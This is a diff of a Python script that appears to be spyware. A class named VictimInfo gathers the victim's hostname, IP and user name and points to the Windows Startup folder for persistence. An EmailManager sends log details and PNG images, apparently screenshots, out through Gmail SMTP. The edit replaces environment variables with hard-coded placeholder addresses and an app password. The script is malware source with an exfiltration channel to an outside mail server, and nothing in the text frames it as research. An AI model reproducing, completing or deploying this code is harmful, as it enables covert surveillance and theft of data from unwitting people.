@@ -6,10 +6,7 @@ import smtplib
 import shutil
 import platform
 from email.message import EmailMessage
-from dotenv import load_dotenv
 
-# Load environment variables from .env file
-load_dotenv()
 
 class VictimInfo:
     def __init__(self):
@@ -18,8 +15,8 @@ class VictimInfo:
         self.ip = socket.gethostbyname(self.hostname)
         self.user = os.getlogin()
         self.execution_dir = os.path.dirname(__file__)
-        self.images_dir = os.getenv('IMAGES_DIR')
-        self.startup_dir = os.getenv('STARTUP_DIR').format(user=self.user)
+        self.images_dir = "C:\\IMAGES"
+        self.startup_dir = f'C:\\Users\\{self.user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
 
     def log_info(self):
         return f"ℹ️ - LOG INFORMATION:\n\n🖥️ | Hostname: {self.hostname}\n⚙️ | System: {self.system}\n📍 | IP: {self.ip}"
@@ -47,8 +44,8 @@ class EmailManager:
     def send_email(subject, body, images_dir):
         try:
             msg = EmailMessage()
-            msg["From"] = os.getenv('EMAIL_SENDER')
-            msg["To"] = os.getenv('EMAIL_RECEIVER')
+            msg["From"] = "emailsender"
+            msg["To"] = "emailreceiver"
             msg["Subject"] = subject
             msg.set_content(body)
 
@@ -57,9 +54,9 @@ class EmailManager:
                 with open(image_path, "rb") as file:
                     msg.add_attachment(file.read(), maintype='image', subtype='png', filename=image)
 
-            server = smtplib.SMTP(os.getenv('SMTP_SERVER'), int(os.getenv('SMTP_PORT')))
+            server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
-            server.login(os.getenv('EMAIL_SENDER'), os.getenv('EMAIL_PASSWORD'))
+            server.login("email", "apppassword")
             server.send_message(msg)
             server.close()
 
